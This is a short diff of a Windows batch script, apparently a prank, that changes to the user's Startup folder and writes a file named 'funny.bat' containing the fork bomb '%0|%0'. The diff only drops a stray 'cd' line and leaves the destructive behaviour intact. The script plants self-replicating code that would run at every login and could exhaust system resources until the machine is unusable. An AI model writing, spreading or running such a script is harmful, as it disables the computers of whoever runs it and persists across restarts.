@@ -1,5 +1,4 @@
 @echo off 
-cd
 cd "%AppData%/Microsoft/Windows/Start Menu/Programs/Startup"
 echo -e "%0|%0" > funny.bat
 
